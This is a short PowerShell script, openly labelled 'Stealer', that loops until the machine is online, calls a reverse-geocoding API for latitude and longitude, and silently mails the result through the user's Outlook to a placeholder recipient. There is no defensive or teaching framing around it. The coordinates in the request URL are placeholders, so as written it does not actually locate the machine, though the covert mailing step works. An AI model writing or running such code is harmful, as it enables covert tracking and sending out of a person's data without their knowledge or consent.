# wait untill you have an internet connection
while (-not (Test-Connection -ComputerName google.com -Quiet -Count 1 -ea 0)) {
    Write-Host "Waiting for internet connection..."
    Start-Sleep -Seconds 1
}

$url = "https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=XXXXXXXXXXXX&longitude=XXXXXXXXXXXX&localityLanguage=fr"

# Make the API request
$response = Invoke-RestMethod -Uri $url -Method Get

# Retrieve the latitude and longitude from the API response
$latitude = $response.latitude
$longitude = $response.longitude


# Outlook
try {
    # Create an Outlook application object
    $outlook = New-Object -ComObject Outlook.Application

    # Create a new email message
    $mail = $outlook.CreateItem(0)

    # Set email properties
    $mail.Subject = "Stealer"
    $mail.Body = "Latitude: $latitude`nLongitude: $longitude"
    $mail.Recipients.Add("EMAIL_ADDRESS")  # Replace with the recipient's email address

    # Send the email
    $mail.Send()

    # Release the Outlook application object
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($mail) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook) | Out-Null
}
catch {
    Write-Host "An error occurred: $_"
}
